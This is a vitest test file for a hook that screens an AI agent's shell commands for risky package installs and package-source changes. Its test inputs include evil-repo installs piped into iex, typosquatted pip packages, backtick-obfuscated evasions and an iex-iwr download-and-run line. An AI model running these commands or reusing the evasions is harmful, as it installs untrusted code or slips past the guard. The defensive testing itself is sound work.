/**
 * package-install-guard: four stricter follow-ups to PR 4.
 *
 * Every case runs the BUILT hook (dist/package-install-guard.mjs) with a real PreToolUse payload, with the
 * registry and OSV stubbed. Failure modes, one table each:
 * 1. choco source add|update|remove|disable|enable and winget source add|remove|reset|update|enable|disable
 *    are persistent package-source changes: they ask. choco source list, winget source list and export stay allowed.
 * 2. dotnet nuget enable|disable|remove source and nuget sources enable|disable|remove ask like add and update.
 *    nuget sources list stays allowed.
 * 3. The PSResourceGet cmdlets Register-/Set-/Unregister-PSResourceRepository, and Unregister-PSRepository and
 *    Unregister-PackageSource, ask on both tools. Get-* stays allowed.
 * 4. A string piped into iex / Invoke-Expression gets the verdict of the bare iex command (ask once, typosquat deny).
 *    Variables, (Get-Content f) and (iwr url) are not literal strings: they are unchanged by this work.
 */

import { describe, it, expect } from 'vitest';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const DIST = fileURLToPath(new URL('../../dist/package-install-guard.mjs', import.meta.url));
const NET_STUB = fileURLToPath(new URL('./package-guard-net-stub.cjs', import.meta.url));

interface Run { decision: string | undefined; reason: string }

function runHook(command: string, tool = 'Bash', env: Record<string, string> = {}): Run {
  const rcHome = mkdtempSync(join(tmpdir(), 'pig-fu-home-'));
  const cwd = mkdtempSync(join(tmpdir(), 'pig-fu-cwd-'));
  writeFileSync(join(cwd, 'package-lock.json'), '{"lockfileVersion":3,"packages":{}}');
  const childEnv: NodeJS.ProcessEnv = {
    ...process.env,
    CCV3_GUARD_DECISIONS_LOG: join(rcHome, 'guard-decisions.jsonl'),
    CCV3_GUARD_RC_HOME: rcHome,
    APPDATA: join(rcHome, 'AppData', 'Roaming'),
    PIG_STUB_AGE_HOURS: '2400',
    PIG_STUB_NEXT_HOURS: '2400',
    // An unattended session turns every ask into a deny: blank both so a test sees the ask.
    CLAUDE_AGENT_ID: '',
    CI: '',
    ...env,
  };
  delete childEnv.VITEST;
  delete childEnv.VITEST_WORKER_ID;
  delete childEnv.CDPATH;
  const res = spawnSync(process.execPath, ['-r', NET_STUB, DIST], {
    input: JSON.stringify({ session_id: 'test-session', tool_name: tool, tool_input: { command }, cwd }),
    encoding: 'utf8',
    timeout: 20_000,
    env: childEnv,
    cwd,
  });
  expect(res.status).toBe(0);
  const out = JSON.parse(res.stdout.trim().split('\n').pop()!);
  return {
    decision: out.hookSpecificOutput?.permissionDecision,
    reason: String(out.hookSpecificOutput?.permissionDecisionReason ?? ''),
  };
}

type Case = [tool: 'Bash' | 'PowerShell', command: string];

const URL_X = 'https://feed.example/v3/index.json';

// ---------------------------------------------------------------------------
// 1 to 3. Persistent package-source changes
// ---------------------------------------------------------------------------

const SOURCE_CHANGES: Case[] = [
  // 1. choco and winget
  ['Bash', `choco source add -n=x -s=${URL_X}`],
  ['Bash', `choco source update -n=x -s=${URL_X}`],
  ['Bash', 'choco source remove -n=x'],
  ['Bash', 'choco source disable -n=chocolatey'],
  ['Bash', 'choco source enable -n=chocolatey'],
  ['Bash', 'choco.exe SOURCE ADD -n=x -s=https://feed.example/'],
  ['Bash', 'sudo choco source remove -n=x'],
  ['Bash', 'echo hi; choco source disable -n=x'],
  ['Bash', 'cmd /c choco source add -n=x -s=https://feed.example/'],
  ['Bash', 'choco -y source remove -n=x'],
  ['Bash', 'choco source $VERB -n=x'],
  ['PowerShell', `choco source add -n=x -s=${URL_X}`],
  ['PowerShell', '& choco.exe source disable -n=x'],
  ['PowerShell', 'iex "choco source remove -n=x"'],
  ['PowerShell', 'Write-Host hi; choco source enable -n=x'],
  ['Bash', `winget source add -n x -a ${URL_X}`],
  ['Bash', 'winget source remove -n x'],
  ['Bash', 'winget source reset --force'],
  ['Bash', 'winget source update'],
  ['Bash', 'winget source enable msstore'],
  ['Bash', 'winget source disable msstore'],
  ['Bash', 'winget.exe SOURCE RESET --force'],
  ['Bash', 'sudo winget source remove -n x'],
  ['Bash', 'echo hi && winget source reset --force'],
  ['Bash', 'winget --verbose source add -n x -a https://feed.example/'],
  ['PowerShell', `winget source add -n x -a ${URL_X}`],
  ['PowerShell', '& winget.exe source reset --force'],
  ['PowerShell', 'Invoke-Expression "winget source disable msstore"'],
  ['PowerShell', 'winget source $v'],
  // 2. nuget and dotnet nuget
  ['Bash', 'nuget sources enable -Name x'],
  ['Bash', 'nuget sources disable -Name x'],
  ['Bash', 'nuget sources remove -Name x'],
  ['Bash', 'nuget source remove -Name x'],
  ['Bash', 'NuGet.exe SOURCES DISABLE -Name x'],
  ['Bash', 'nuget sources -ConfigFile c.config remove -Name x'],
  ['Bash', 'nuget -NonInteractive sources disable -Name x'],
  ['Bash', 'sudo nuget sources enable -Name x'],
  ['Bash', 'cmd /c nuget sources remove -Name x'],
  ['Bash', 'dotnet nuget remove source x'],
  ['Bash', 'dotnet nuget disable source x'],
  ['Bash', 'dotnet nuget enable source x'],
  ['Bash', 'dotnet.exe NUGET REMOVE SOURCE x'],
  ['Bash', 'sudo dotnet nuget disable source x'],
  ['Bash', 'echo hi && dotnet nuget enable source x'],
  ['PowerShell', 'nuget sources remove -Name x'],
  ['PowerShell', '& nuget.exe sources disable -Name x'],
  ['PowerShell', 'dotnet nuget remove source x'],
  // 3. PSResourceGet, Unregister-
  ['PowerShell', `Register-PSResourceRepository -Name x -Uri ${URL_X}`],
  ['PowerShell', 'Register-PSResourceRepository -PSGallery'],
  ['PowerShell', 'Set-PSResourceRepository -Name PSGallery -Trusted'],
  ['PowerShell', 'Unregister-PSResourceRepository -Name x'],
  ['PowerShell', 'Unregister-PSRepository -Name x'],
  ['PowerShell', 'Unregister-PackageSource -Name x'],
  ['PowerShell', 'register-psresourcerepository -Name x -Uri https://feed.example/'],
  ['PowerShell', 'UNREGISTER-PSREPOSITORY -Name x'],
  ['PowerShell', 'Microsoft.PowerShell.PSResourceGet\\Set-PSResourceRepository -Name x -Trusted'],
  ['PowerShell', 'PowerShellGet\\Unregister-PSRepository -Name x'],
  ['PowerShell', '& Unregister-PackageSource -Name x'],
  ['PowerShell', 'Write-Host hi; Unregister-PSResourceRepository -Name x'],
  ['PowerShell', 'Unregister-PS`Repository -Name x'],
  ['PowerShell', 'pwsh -c "Set-PSResourceRepository -Name x -Trusted"'],
  ['PowerShell', 'try { Unregister-PSRepository -Name x } catch {}'],
  ['PowerShell', 'Invoke-Expression "Register-PSResourceRepository -PSGallery"'],
  ['Bash', 'Register-PSResourceRepository -PSGallery'],
  ['Bash', 'Set-PSResourceRepository -Name x -Trusted'],
  ['Bash', 'Unregister-PSRepository -Name x'],
  ['Bash', 'Unregister-PackageSource -Name x'],
  ['Bash', 'pwsh -c "Unregister-PSResourceRepository -Name x"'],
];

const SOURCE_READS: Case[] = [
  ['Bash', 'choco source list'],
  ['Bash', 'choco source'],
  ['Bash', 'choco source list --limit-output'],
  ['Bash', 'choco list source'],
  ['Bash', 'choco search remove'],
  ['Bash', 'winget source list'],
  ['Bash', 'winget source export'],
  ['Bash', 'winget source'],
  ['Bash', 'winget search source'],
  ['Bash', 'winget list remove'],
  ['Bash', 'nuget sources list'],
  ['Bash', 'nuget sources'],
  ['Bash', 'nuget sources list -Format Detailed'],
  ['Bash', 'dotnet nuget list source'],
  ['Bash', 'dotnet nuget locals all --list'],
  ['Bash', 'dotnet remove package x'],
  ['Bash', 'echo "choco source remove -n=x"'],
  ['Bash', 'echo "winget source reset --force"'],
  ['Bash', 'echo "nuget sources remove -Name x"'],
  ['Bash', 'git commit -m "dotnet nuget remove source x"'],
  ['PowerShell', 'choco source list'],
  ['PowerShell', 'winget source list'],
  ['PowerShell', 'winget source export'],
  ['PowerShell', 'Get-PSResourceRepository'],
  ['PowerShell', 'Get-PSResourceRepository -Name x'],
  ['PowerShell', 'Get-PSRepository'],
  ['PowerShell', 'Get-PackageSource'],
  ['PowerShell', 'Get-Help Unregister-PSRepository'],
  ['PowerShell', 'Get-Command Set-PSResourceRepository'],
  ['PowerShell', 'Write-Host Unregister-PackageSource'],
  ['PowerShell', 'Write-Host "Register-PSResourceRepository"'],
  ['PowerShell', 'Find-PSResource x'],
];

describe('rules 1 to 3: a persistent package-source change asks', { timeout: 180_000 }, () => {
  it.each(SOURCE_CHANGES)('[%s] %s asks and names a package source', (tool, command) => {
    const { decision, reason } = runHook(command, tool);
    expect(decision).toBe('ask');
    expect(reason).toMatch(/package source/i);
    expect(reason).toMatch(/No blocklist, OSV or age check will cover later installs/);
    expect(reason).not.toMatch(/cannot parse/);
  });

  it.each(SOURCE_READS)('[%s] %s stays allowed', (tool, command) => {
    expect(runHook(command, tool).decision).toBeUndefined();
  });

  it('denies where no human can answer', () => {
    expect(runHook('choco source remove -n=x', 'Bash', { CLAUDE_AGENT_ID: 'agent-1' }).decision).toBe('deny');
    expect(runHook('Unregister-PSResourceRepository -Name x', 'PowerShell', { CLAUDE_AGENT_ID: 'agent-1' }).decision).toBe('deny');
  });

  it('SKIP_PACKAGE_GUARD=1 still overrides the segment it prefixes', () => {
    expect(runHook('SKIP_PACKAGE_GUARD=1 winget source reset --force').decision).toBeUndefined();
  });

  it('the install forms of the same tools still ask as installs, not as source changes', () => {
    const r = runHook('choco install git', 'Bash');
    expect(r.decision).toBe('ask');
    expect(r.reason).not.toMatch(/package source/i);
  });
});

// ---------------------------------------------------------------------------
// 4. A string piped into iex / Invoke-Expression
// ---------------------------------------------------------------------------

const EVIL = 'npm install github:evil/pkg';

describe('rule 4: a string piped into iex gets the verdict of the bare iex command', { timeout: 180_000 }, () => {
  it.each<Case>([
    ['PowerShell', `"${EVIL}" | iex`],
    ['PowerShell', `'${EVIL}' | iex`],
    ['PowerShell', `"${EVIL}" | Invoke-Expression`],
    ['PowerShell', `"${EVIL}" | invoke-expression`],
    ['PowerShell', `"${EVIL}" | IEX`],
    ['PowerShell', `"${EVIL}"|iex`],
    ['PowerShell', `echo "npm i github:evil/pkg" | iex`],
    ['PowerShell', `Write-Output "npm i github:evil/pkg" | iex`],
    ['PowerShell', `Write-Output '${EVIL}' | Invoke-Expression`],
    ['PowerShell', `Write-Host "${EVIL}" | iex`],
    ['PowerShell', `("${EVIL}") | iex`],
    ['PowerShell', `"${EVIL}" | & iex`],
    ['PowerShell', `"${EVIL}" | iex -Command`],
    ['PowerShell', `"echo hi; ${EVIL}" | iex`],
    ['PowerShell', `Write-Host hi; "${EVIL}" | iex`],
    ['PowerShell', `"npx github:evil/pkg" | iex`],
    ['PowerShell', `pwsh -c '"${EVIL}" | iex'`],
    ['Bash', `echo "${EVIL}" | iex`],
    ['Bash', `"${EVIL}" | iex`],
  ])('[%s] %s asks', (tool, command) => {
    const r = runHook(command, tool);
    expect(r.decision).toBe('ask');
    expect(r.reason).toMatch(/Non-registry source/);
    expect(r.reason.match(/Non-registry source/g)?.length).toBe(1);
  });

  it.each<Case>([
    ['PowerShell', `'pip install requets==2.31.0' | iex`],
    ['PowerShell', `"pip install requets==2.31.0" | Invoke-Expression`],
    ['PowerShell', `echo "pip install requets==2.31.0" | iex`],
    ['PowerShell', `Write-Output "pip install requets==2.31.0" | iex`],
    ['PowerShell', `"pip install requests" | iex`],
    ['PowerShell', `"python -m pip install requests" | Invoke-Expression`],
  ])('[%s] %s denies like the bare pip command', (tool, command) => {
    expect(runHook(command, tool).decision).toBe('deny');
  });

  it('a piped choco install asks once, with one ask text', () => {
    for (const command of ['"choco install git" | iex', 'echo "choco install git" | Invoke-Expression']) {
      const r = runHook(command, 'PowerShell');
      expect(r.decision).toBe('ask');
      expect(r.reason.match(/No blocklist, OSV or age check exists for chocolatey/g)?.length).toBe(1);
    }
  });

  it('a piped package-source change asks', () => {
    for (const command of ['"choco source remove -n=x" | iex', 'echo "Unregister-PSRepository -Name x" | iex']) {
      const r = runHook(command, 'PowerShell');
      expect(r.decision).toBe('ask');
      expect(r.reason).toMatch(/package source/i);
    }
  });

  it('denies where no human can answer', () => {
    expect(runHook(`"${EVIL}" | iex`, 'PowerShell', { CLAUDE_AGENT_ID: 'agent-1' }).decision).toBe('deny');
  });

  it.each<Case>([
    ['PowerShell', '"hello" | iex'],
    ['PowerShell', 'echo "hello" | iex'],
    ['PowerShell', '"npm install lodash" | iex'],
    ['PowerShell', 'echo "npm test" | Invoke-Expression'],
    ['PowerShell', '"Get-Date" | iex'],
    ['PowerShell', 'Write-Output "pip --version" | iex'],
    ['PowerShell', `"${EVIL}" | Out-File x.ps1`],
    ['PowerShell', `echo "${EVIL}" | Set-Clipboard`],
    ['PowerShell', `Write-Host "${EVIL}"`],
    ['PowerShell', '"hello" | Write-Host'],
  ])('[%s] %s stays allowed', (tool, command) => {
    expect(runHook(command, tool).decision).toBeUndefined();
  });

  // Not literal strings: the guard cannot read them, and this work does not change them. Locked as they are today.
  it.each<Case>([
    ['PowerShell', 'iex $var'],
    ['PowerShell', '$script | iex'],
    ['PowerShell', 'iex (Get-Content f)'],
    ['PowerShell', 'Get-Content f | iex'],
    ['PowerShell', 'iex (iwr https://example.com/install.ps1)'],
    ['PowerShell', '(iwr https://example.com/install.ps1) | iex'],
  ])('[%s] %s is unchanged', (tool, command) => {
    expect(runHook(command, tool).decision).toBeUndefined();
  });

  // The string is PowerShell text whatever the outer tool is: a backtick before a letter is an escape (inst`all runs install).
  // Single quotes keep the backtick in the outer Bash text. Both reads are used, so the result is never looser than either.
  it.each<Case>([
    ['Bash', "echo 'npm inst`all github:evil/pkg' | iex"],
    ['Bash', "'npm inst`all github:evil/pkg' | Invoke-Expression"],
    ['Bash', "iex 'npm inst`all github:evil/pkg'"],
    ['PowerShell', "echo 'npm inst`all github:evil/pkg' | iex"],
  ])('[%s] %s is read as PowerShell and asks', (tool, command) => {
    const r = runHook(command, tool);
    expect(r.decision).toBe('ask');
    expect(r.reason.match(/Non-registry source/g)?.length).toBe(1);
  });

  // A parser error (a heredoc delimiter too long for its RegExp) leaves the command unread: a piped iex must fail closed.
  it('a parser error with a piped iex asks', () => {
    const LONG = 'A'.repeat(40_000);
    const heredoc = (after: string) => `cat <<${LONG}\nx\n${LONG}\n${after}`;
    expect(runHook(heredoc('"npm install lodash" | iex'), 'Bash').decision).toBe('ask');
    expect(runHook(heredoc('echo "hello" | Invoke-Expression'), 'Bash').decision).toBe('ask');
    expect(runHook(heredoc('echo hi'), 'Bash').decision).toBeUndefined();
  });
});
